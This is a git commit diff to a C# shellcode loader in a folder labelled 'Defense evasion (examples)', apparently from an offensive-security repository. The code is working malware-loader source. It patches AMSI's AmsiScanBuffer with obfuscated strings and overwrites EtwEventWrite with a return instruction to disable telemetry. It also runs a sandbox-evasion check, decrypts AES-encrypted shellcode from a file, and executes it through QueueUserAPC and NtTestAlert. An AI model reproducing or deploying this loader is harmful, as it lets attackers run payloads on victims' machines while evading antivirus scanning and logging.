9576235f0de29213243b6559c66b4db643f8c412
JFR-C <61638766+JFR-C@users.noreply.github.com>
2025-10-08 02:18:41 +0200

    Update

--- Defense evasion (examples)/ShellCodeLoader3/CsharpShellCodeLoader3.cs
+++ Defense evasion (examples)/ShellCodeLoader3/CsharpShellCodeLoader3.cs
@@ -19,39 +19,40 @@ namespace  CsharpShellCodeLoader
 
     class Program
     {
-		
+
+	  [DllImport("kernel32.dll")]
+	  static extern IntPtr LoadLibrary(string lpFileName);
+
+	  [DllImport("kernel32.dll")]
+	  static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
+
 	  [DllImport("ntdll.dll")]
 	   public static extern NTSTATUS NtTestAlert();
 
-	  [DllImport("kernel32.dll")]
-	   public static extern IntPtr VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType,  AllocationProtect flProtect);
-
-	  [DllImport("kernel32.dll")]
-	   public static extern IntPtr GetCurrentThread();
-
-	  [DllImport("kernel32.dll", SetLastError = true)]
-	   public static extern UInt32 QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, UInt32 dwData);	
-
-      [DllImport("kernel32.dll")]
-       static extern void Sleep(uint dwMilliseconds);
-
-      [DllImport("kernel32")]
-	   public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-
-      [DllImport("kernel32")]
-	   public static extern IntPtr LoadLibrary(string name);
-	
       [DllImport("kernel32.dll")]
 	   public static extern IntPtr GetModuleHandle(string lpModuleName);
+	   
+	  // Define delegates for each API
+	  [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+	  delegate IntPtr VirtualAllocDelegate(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
 
-      [DllImport("kernel32")]
-	   public static extern bool VirtualProtect(IntPtr lpAddress, UInt32 dwSize, uint flNewProtect, out uint lpflOldProtect);
+	  [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+	  delegate IntPtr GetCurrentThreadDelegate();
 
-      [DllImport("kernel32.dll")]
-	   public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+	  [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+	  delegate UInt32 QueueUserAPCDelegate(IntPtr pfnAPC, IntPtr hThread, UInt32 dwData);
 
-      [DllImport("kernel32.dll", SetLastError = true)]
-	   private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out int lpNumberOfBytesWritten);
+	  [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+	  delegate void SleepDelegate(uint dwMilliseconds);
+
+	  [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+	  delegate bool VirtualProtectDelegate(IntPtr lpAddress, UInt32 dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+	  [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+	  delegate bool VirtualProtectBisDelegate(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+	  [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+	  delegate bool WriteProcessMemoryDelegate(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out int lpNumberOfBytesWritten);
 
 	   
 	   public enum NTSTATUS : uint {
@@ -125,41 +126,40 @@ namespace  CsharpShellCodeLoader
 			return decryptedBytes;
 		}
 		
-        // AMSI patching 		
-		public static void PatchAmsi()
-		{
-			IntPtr lib = LoadLibrary("ams"+"i.dl"+"l");
-			IntPtr aammssii = GetProcAddress(lib, "A"+"msiSc"+"anBu"+"ffe"+"r");
-			IntPtr final = IntPtr.Add(aammssii, 0x95);
-			uint old = 0;
-			VirtualProtect(final, (UInt32)0x1, 0x40, out old);
-			byte[] patch = new byte[] { 0x75 };
-			Marshal.Copy(patch, 0, final, 1);
-		}	
-		
-        // ETW patching 		
-		public static void PatchEtw()
-		{
-			const uint PAGE_EXECUTE_READWRITE = 0x40;
-			string ntdllModuleName = "ntdll.dll";
-			string etwEventWriteFunctionName = "EtwEventWrite";
-
-			IntPtr ntdllModuleHandle = GetModuleHandle(ntdllModuleName);
-			IntPtr etwEventWriteAddress = GetProcAddress(ntdllModuleHandle, etwEventWriteFunctionName);
-
-			byte[] retOpcode = { 
-			0xC3 
-			};
-
-			uint oldProtect;
-			VirtualProtect(etwEventWriteAddress, (UIntPtr)retOpcode.Length, PAGE_EXECUTE_READWRITE, out oldProtect);
-			
-			int bytesWritten;
-			WriteProcessMemory(Process.GetCurrentProcess().Handle, etwEventWriteAddress, retOpcode, (uint)retOpcode.Length, out bytesWritten);
-		}
 
         static void Main(string[] args)
         {
+			IntPtr hKernel32 = LoadLibrary("kernel32.dll");
+
+			// Resolve VirtualAlloc
+			IntPtr pVirtualAlloc = GetProcAddress(hKernel32, "VirtualAlloc");
+			var VirtualAlloc = (VirtualAllocDelegate)Marshal.GetDelegateForFunctionPointer(pVirtualAlloc, typeof(VirtualAllocDelegate));
+
+			// Resolve GetCurrentThread
+			IntPtr pGetCurrentThread = GetProcAddress(hKernel32, "GetCurrentThread");
+			var GetCurrentThread = (GetCurrentThreadDelegate)Marshal.GetDelegateForFunctionPointer(pGetCurrentThread, typeof(GetCurrentThreadDelegate));
+
+			// Resolve QueueUserAPC
+			IntPtr pQueueUserAPC = GetProcAddress(hKernel32, "QueueUserAPC");
+			var QueueUserAPC = (QueueUserAPCDelegate)Marshal.GetDelegateForFunctionPointer(pQueueUserAPC, typeof(QueueUserAPCDelegate));
+
+			// Resolve Sleep
+			IntPtr pSleep = GetProcAddress(hKernel32, "Sleep");
+			var Sleep = (SleepDelegate)Marshal.GetDelegateForFunctionPointer(pSleep, typeof(SleepDelegate));
+
+			// Resolve VirtualProtect
+			IntPtr pVirtualProtect = GetProcAddress(hKernel32, "VirtualProtect");
+			var VirtualProtect = (VirtualProtectDelegate)Marshal.GetDelegateForFunctionPointer(pVirtualProtect, typeof(VirtualProtectDelegate));
+
+			// Resolve VirtualProtect
+			IntPtr pVirtualProtectBis = GetProcAddress(hKernel32, "VirtualProtect");
+			var VirtualProtectBis = (VirtualProtectBisDelegate)Marshal.GetDelegateForFunctionPointer(pVirtualProtect, typeof(VirtualProtectBisDelegate));
+
+			// Resolve WriteProcessMemory
+			IntPtr pWriteProcessMemory = GetProcAddress(hKernel32, "WriteProcessMemory");
+			var WriteProcessMemory = (WriteProcessMemoryDelegate)Marshal.GetDelegateForFunctionPointer(pWriteProcessMemory, typeof(WriteProcessMemoryDelegate));
+
+
 			// Exit if no argument and do not provide information except "Missing arguments".
 			if (args.Length < 1)
 			{
@@ -171,10 +171,29 @@ namespace  CsharpShellCodeLoader
 			string CheckMyDomainName = args[0];
 			BasicSandBoxEvasion(CheckMyDomainName);
 			
-			// A-M-S-I & E-T-W patching
-			PatchAmsi();
-			PatchEtw();
-		
+			// A-M-S-I patching
+			IntPtr lib = LoadLibrary("ams"+"i.dl"+"l");
+			IntPtr aammssii = GetProcAddress(lib, "A"+"msiSc"+"anBu"+"ffe"+"r");
+			IntPtr final = IntPtr.Add(aammssii, 0x95);
+			uint old = 0;
+			VirtualProtect(final, (UInt32)0x1, 0x40, out old);
+			byte[] patch = new byte[] { 0x75 };
+			Marshal.Copy(patch, 0, final, 1);
+
+			// E-T-W patching
+			const uint PAGE_EXECUTE_READWRITE = 0x40;
+			string ntdllModuleName = "ntdll.dll";
+			string etwEventWriteFunctionName = "EtwEventWrite";
+			IntPtr ntdllModuleHandle = GetModuleHandle(ntdllModuleName);
+			IntPtr etwEventWriteAddress = GetProcAddress(ntdllModuleHandle, etwEventWriteFunctionName);
+			byte[] retOpcode = { 
+			0xC3 
+			};
+			uint oldProtect;
+			VirtualProtectBis(etwEventWriteAddress, (UIntPtr)retOpcode.Length, PAGE_EXECUTE_READWRITE, out oldProtect);
+			int bytesWritten;
+			WriteProcessMemory(Process.GetCurrentProcess().Handle, etwEventWriteAddress, retOpcode, (uint)retOpcode.Length, out bytesWritten);
+
 			// The second argument is the path to the file containing your aes encrypted shellcode encoded in base 64 (i.e., .\path\file.txt or C:\path\file.txt)
 			string encodedfilepath = args[1];
 			string encodedfile = File.ReadAllText(encodedfilepath);
@@ -184,13 +203,27 @@ namespace  CsharpShellCodeLoader
 			string passkey = args[2];
 			byte[] passkeyBytes = Encoding.UTF8.GetBytes(passkey);
 			passkeyBytes = SHA256.Create().ComputeHash(passkeyBytes);
-			
+
+			// Decrypt the shellcode
 			byte[] buffer = AES_Decrypt(aesencryptedshellcode, passkeyBytes);
-            IntPtr funcAddr = VirtualAlloc(0, (UInt32)buffer.Length, 0x1000, AllocationProtect.PAGE_EXECUTE_READWRITE);
-            Marshal.Copy(buffer, 0, (IntPtr)(funcAddr), buffer.Length);
-            IntPtr CurrentThread_hanlde = GetCurrentThread();
-            QueueUserAPC(funcAddr, CurrentThread_hanlde, 0);
+			
+			// Allocate memory with RWX (PAGE_EXECUTE_READWRITE)
+			IntPtr funcAddr = VirtualAlloc(0, (UInt32)buffer.Length, 0x1000, (uint)AllocationProtect.PAGE_EXECUTE_READWRITE);
+
+			// Copy the shellcode or buffer into the allocated memory
+			Marshal.Copy(buffer, 0, funcAddr, buffer.Length);
+
+			// Change protection to RX (remove write access)
+			uint oldProtectBis;
+			bool success = VirtualProtectBis(funcAddr, (UIntPtr)buffer.Length, (uint)AllocationProtect.PAGE_EXECUTE_READ, out oldProtectBis);
+
+			// Get current thread handle
+			IntPtr CurrentThread_handle = GetCurrentThread();
+
+			// Shellcode execution using Asynchronous Procedure Call (APC) and the NtTestAlert function
+			QueueUserAPC(funcAddr, CurrentThread_handle, 0);
             NtTestAlert();
+				
         }
     }
 }
